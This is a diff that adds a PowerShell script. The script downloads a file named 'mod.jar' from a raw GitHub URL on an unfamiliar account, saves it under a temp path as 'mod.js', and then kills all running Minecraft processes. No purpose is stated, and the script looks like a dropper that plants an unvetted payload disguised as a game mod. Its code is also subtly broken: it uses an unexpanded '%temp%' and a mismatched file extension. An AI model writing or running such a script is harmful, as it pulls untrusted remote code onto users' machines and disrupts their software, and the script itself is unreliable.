@@ -1,0 +1,20 @@
+# Define the URL of the file to download
+$url = "https://raw.githubusercontent.com/drhaplan-dotcom/qwe/refs/heads/main/mod.jar"
+
+# Define the path where the file will be saved
+$outputPath = "%temp%\mod.js"
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+# Check if the download was successful
+if (Test-Path -Path $outputPath) {
+    Write-Output "File downloaded successfully to: $outputPath"
+
+    # Close all running Minecraft instances
+    Get-Process | Where-Object { $_.ProcessName -eq "javaw" -and $_.MainWindowTitle -like "*Minecraft*" } | ForEach-Object { $_.Kill() }
+
+    Write-Output "All Minecraft instances have been closed."
+} else {
+    Write-Output "Failed to download the file."
+}
